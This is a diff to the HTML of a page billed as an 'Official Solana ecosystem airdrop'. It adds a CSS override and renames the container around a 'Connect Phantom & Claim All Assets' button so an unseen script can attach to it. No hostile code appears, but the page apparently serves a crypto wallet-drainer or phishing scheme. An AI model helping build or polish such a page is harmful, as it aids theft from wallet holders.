@@ -7,6 +7,17 @@
     <meta name="description" content="Official Solana ecosystem airdrop. Claim SMAX and SPL tokens." />
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <!-- Your existing styles.css can stay, but we add a small override for .button-container -->
+    <style>
+        /* Keep your existing styles, but ensure .button-container matches .claim-button-container */
+        .button-container {
+            position: relative;
+            width: 100%;
+            margin-top: 10px;
+        }
+        /* If you used .claim-button-container in your styles, replace with .button-container, or keep both */
+        /* The script adds a dropdown inside .button-container, so it must exist */
+    </style>
     <link rel="stylesheet" href="styles.css" />
 </head>
 <body>
@@ -98,8 +109,8 @@
                     </div>
                 </div>
 
-                <!-- Claim Button (keep original id) -->
-                <div class="claim-button-container">
+                <!-- Claim Button Container – now .button-container for the script -->
+                <div class="button-container">
                     <button id="connect-wallet" class="solana-claim-button"><i class="fas fa-wallet"></i> Connect Phantom & Claim All Assets</button>
                 </div>
 
